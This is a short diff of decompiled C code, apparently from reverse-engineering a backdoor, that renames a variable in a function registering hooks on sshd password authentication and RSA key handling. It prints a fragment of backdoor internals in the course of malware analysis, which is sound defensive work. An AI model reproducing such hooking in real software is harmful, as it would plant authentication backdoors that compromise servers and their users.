@@ -15,16 +15,15 @@
 int init_shared_globals(backdoor_shared_globals_t *shared_globals)
 
 {
-  int iVar1;
   int status;
   
-  iVar1 = 5;
+  status = 5;
   if (shared_globals != (backdoor_shared_globals_t *)0x0) {
     shared_globals->mm_answer_authpassword_hook = mm_answer_authpassword_hook;
     shared_globals->hook_EVP_PKEY_set1_RSA = hook_EVP_PKEY_set1_RSA;
     shared_globals->globals = (global_context_t **)&global_ctx;
-    iVar1 = 0;
+    status = 0;
   }
-  return iVar1;
+  return status;
 }
 
